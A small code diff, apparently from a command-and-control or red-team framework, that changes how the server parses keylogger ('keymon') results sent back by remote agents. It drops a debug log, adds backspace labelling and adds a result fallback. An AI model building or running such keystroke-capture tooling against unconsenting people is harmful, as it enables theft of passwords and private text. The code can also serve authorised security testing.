@@ -215,7 +215,6 @@ export const setResult = async (agentID, data) => {
   task.dateCompleted = Date.now();
   if (task.taskType === "keymon"){
     task.result = "";
-    console.log(data);
     // Parse main keyboard dumps.
     let keys = data["main-kbd"];
     if (keys){
@@ -312,6 +311,8 @@ export const setResult = async (agentID, data) => {
         for (let code of codes){
           if (code == 10 || code == 13)
             result += "[ENTER] ";
+          else if (code == 0x7f)
+            result += "[BACKSPACE] ";
           else if (code <= 31 || code >= 127)
             result += `0x${code.toString(16).padStart(2, '0')} `;
           else
@@ -326,6 +327,10 @@ export const setResult = async (agentID, data) => {
     result = result.toString().replace(/\r\n+$/, "");
     result = result.replace(/\n+$/, "");
     task.result = result;
+  }
+  if (!task.result){
+    if (result)
+      task.result = result;
   }
   await task.save();
   socketServer.emit("update_task", task);
